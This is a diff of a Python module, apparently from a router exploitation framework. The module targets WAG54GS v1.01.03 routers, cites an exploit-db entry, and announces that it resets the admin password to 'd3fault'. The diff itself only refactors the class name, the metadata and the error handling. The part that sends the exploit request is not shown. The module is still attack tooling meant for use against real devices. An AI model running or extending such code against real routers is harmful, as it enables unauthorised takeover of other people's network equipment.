@@ -1,17 +1,17 @@
 import urllib
 import util
-import traceback,sys
+import sys
 from ..router_vuln import RouterVuln
 
-__router__='WAG54GS v1.01.03'
-__vuln__='Change Admin Password'
-class ChangeAdmin(RouterVuln):
+class wag54gs_change_admin(RouterVuln):
 	"""Change the admin password to d3fault.
 	   http://www.exploit-db.com/exploits/18503/
 	"""
 
 	def __init__(self):
-		super(ChangeAdmin,self).__init__()
+		self.router = 'WAG54GS v1.01.03'
+		self.vuln   = 'Change Admin Password'
+		super(wag54gs_change_admin,self).__init__()
 	
 	def run(self):
 		util.Msg('Changing admin password to \'d3fault\'...')
@@ -31,5 +31,4 @@ class ChangeAdmin(RouterVuln):
 			print response
 			util.Msg('Done.  Password reset to \'d3fault\'')
 		except Exception,e:
-			traceback.print_exc(file=sys.stdout)
 			util.Error('Error: %s'%e)
